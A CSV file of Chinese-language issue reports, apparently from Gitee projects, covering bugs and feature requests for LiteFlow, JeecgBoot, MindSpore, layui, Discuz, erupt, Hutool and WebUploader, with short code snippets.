title,text
zk数据源使用问题,"或许是我对zk不熟，仅仅这样配置就能监听到配置的变化？不用指定监听哪个zk node之类的？或者有关于zk更详细的使用例子吗？   <code>: zk方式：liteflow.rule-source=el_yml:127.0.0.1:2181,127.0.0.1:2182,127.0.0.1:2183"
代码生成器是不是不支持H2数据库,版本号：3.1.0 项目使用H2数据库，在操作时，无法查询到H2数据库表。 经调试，能进入到62行代码中，不过，这里的条件是查询不出来数据，H2数据库条件应该是，问一下，需要做什么配置才能查询到H2数据库表呢？谢谢~   <code>: 在线开发 &gt; Online表单开发 &gt; 导入数据库表 jdbc:h2:tcp://127.0.0.1:9092/jeecg-boot;MODE=MySQL MODE=MySQL table_schema table_catalog
[CT][MS][Lusolve]GPU性能偶现不达标,"交付件性能用例GPU性能偶现不达标 / 硬件环境: GPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph def test_p_lusolve_10w_performance(): x = np.random.randn(100, 10, 10).astype(np.float32) a = torch.rand(100, 10, 10) data, pivots = torch.lu(a) lu_data = np.asarray(data, np.float32) lu_pivots = np.asarray(pivots, np.int32) fact = LuSolveMock(inputs=[Tensor(x), Tensor(lu_data), Tensor(lu_pivots)]) fact.forward_profile_cmp() run testcase testcase pass   <code>: ![faile](https://foruda.gitee.com/images/1667826113682145932/cc5f94da_10814128.png ""屏幕截图"")"
laytpl的模板中有tr，td标签时laytpl会报错,"在页面中定义的模板，渲染时会报错： Laytpl Error：ReferenceError: item is not defined 将tr td全部换成div就不会报错   <code>: &lt;script type=""text/html"" id=""table-tpl""&gt; {{# layui.each(d, function(index, item){ }} &lt;tr id=""item_{{item.id}}"" class=""tr-item""&gt; &lt;td class=""text-center""&gt; &lt;input type=""hidden"" value=""0""/&gt; &lt;input type=""checkbox"" lay-skin=""primary"" value=""{{item.id}}"" lay-filter=""check""/&gt; &lt;/td&gt; {{# if(item.model==1){ }} &lt;td class=""text-center""&gt;&lt;span class=""text-green""&gt;增项&lt;/span&gt;&lt;/td&gt; {{# }else{ }} &lt;td class=""text-center""&gt;&lt;span class=""text-red""&gt;减项&lt;/span&gt;&lt;/td&gt; {{# } }} &lt;td&gt;{{item.name}}&lt;/td&gt; &lt;td&gt;&lt;input type=""text"" class=""layui-input"" value=""{{item.amt}}"" placeholder=""{{item.name}}""/&gt;&lt;/td&gt; &lt;td&gt;{{item.memo}}&lt;/td&gt; &lt;/tr&gt; {{# }); }} &lt;/script&gt;"
[BUG][MD]The pyfunc process is suspended due to an error.,": /device gpu /device cpu : -- MindSpore version :20210616 master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : pytest -s test_func_usability_issues.py::test_func_usability_issues_01 用例执行中卡死不退出 用例执行中异常正常抛出错误   <code>: def pass_func(_): for i in range(10): yield (np.array([i]),) def test_func_manifest_dataset_01(): data = ds.ManifestDataset(dataset_file ) data = data.map(operations=pass_func, input_columns=[""image""], num_parallel_workers=1, python_multiprocessing=True) num_iter = 0 for _ in data.create_dict_iterator(output_numpy=True): num_iter += 1"
SoftmaxCrossEntropyWithLogits sparse为False情况下，高维度输入出错,": GPU 让我对输入logits是否能取更高维度产生了怀疑。。   <code>: loss = nn.SoftmaxCrossEntropyWithLogits(sparse=False, reduction=""mean"") # logits shape (2, 5), labels shape(2, 5) logits = Tensor([[2, 4, 1, 4, 5], [2, 1, 2, 4, 3]], mindspore.float32) labels = Tensor([[0, 0, 0, 0, 1], [0, 0, 0, 1, 0]], mindspore.float32) output = loss(logits, labels) print(output) print(output.shape) # logits shape (1, 2, 5), labels shape(1, 2, 5) logits = Tensor([[[2, 4, 1, 4, 5], [2, 1, 2, 4, 3]]], mindspore.float32) labels = Tensor([[[0, 0, 0, 0, 1], [0, 0, 0, 1, 0]]], mindspore.float32) output = loss(logits, labels) print(output) print(output.shape) import tensorflow as tf print(tf.__version__) # 2.6.0 loss = tf.keras.losses.CategoricalCrossentropy(from_logits=True) logits = tf.constant([[2, 4, 1, 4, 5], [2, 1, 2, 4, 3]], dtype=tf.float32) labels = tf.constant([[0, 0, 0, 0, 1], [0, 0, 0, 1, 0]], dtype=tf.float32) output = loss(labels, logits) print(output) logits = tf.constant([[[2, 4, 1, 4, 5], [2, 1, 2, 4, 3]]], dtype=tf.float32) labels = tf.constant([[[0, 0, 0, 0, 1], [0, 0, 0, 1, 0]]], dtype=tf.float32) output = loss(labels, logits) print(output)"
"2个建议: 支持查看自己点过的""支持""和""反对""并可以取消，点评那用户名太长会导致换行",https://gitee.com/Discuz/DiscuzX/blob/master/upload/template/default/forum/viewthread_node.htm#L412 有个列表列出自己和的回复，并且能取消操作避免误点 而且点反对的会被显示到推荐？？ 回复的点评列表，如果名字太长，比如15个英文就会造成换行   <code>: 支持 反对
1.6.7的版本还没解决@Drill里的link不用主键关联的问题,"JDK版本： openjdk_8_201 erupt版本： 1.X.X   <code>: @Erupt(name=""xxx"") public class Test{ }"
是否能够增加IPUtil以方便获取服务所在服务器的IP,"使用的JDK版本和Hutool版本 JDK8、hutool 5.0.6 大佬好，在日常开放中，不免会用到异常推送，比如项目报错，直接推一条消息到邮件或终端、监控系统等，此时如果单单只推一条消息，若服务部署在多台服务器时，将无法准确得知这个错误是来自哪台服务器的，此时就可以尝试获取服务器的IP，追加到推送消息中，我们收到时就可以准确的得知是哪台服务i去报错了，工作中自己在网上找了一个实现的方法，是否可以融合在hutool未来的版本中，以方便大家，若方法有何不足或有更好的实现，欢迎作者大大修改或有更好的实现。 代码如下   <code>: /** * 获取服务器地址 * * @return Ip地址 */ public static String getServerIp() { // 获取操作系统类型 String sysType = System.getProperties().getProperty(""os.name""); String ip; if (sysType.toLowerCase().startsWith(""win"")) { // 如果是Windows系统，获取本地IP地址 String localIP = null; try { localIP = InetAddress.getLocalHost().getHostAddress(); } catch (UnknownHostException e) { LOG.error(e.getMessage(), e); } if (localIP != null) { return localIP; } } else { ip = getIpByEthNum(""eth0""); // 兼容Linux if (ip != null) { return ip; } } return ""获取服务器IP错误""; } /** * 根据网络接口获取IP地址 * @param ethNum 网络接口名，Linux下是eth0 * @return */ @SuppressWarnings(""rawtypes"") private static String getIpByEthNum(String ethNum) { try { Enumeration allNetInterfaces = NetworkInterface.getNetworkInterfaces(); InetAddress ip; while (allNetInterfaces.hasMoreElements()) { NetworkInterface netInterface = (NetworkInterface) allNetInterfaces.nextElement(); if (ethNum.equals(netInterface.getName())) { Enumeration addresses = netInterface.getInetAddresses(); while (addresses.hasMoreElements()) { ip = (InetAddress) addresses.nextElement(); if (ip != null &amp;&amp; ip instanceof Inet4Address) { return ip.getHostAddress(); } } } } } catch (SocketException e) { LOG.error(e.getMessage(), e); } return ""获取服务器IP错误""; }"
form:fileupload 如何设置非自动上传？,"WebUploader官网可以通过auto设置false，限制自动上传，但由于被重新封装过，这块想问下是否支持 ** **   <code>: // 初始化Web Uploader var uploader = WebUploader.create({ // 选完文件后，是否自动上传。 auto: true,"
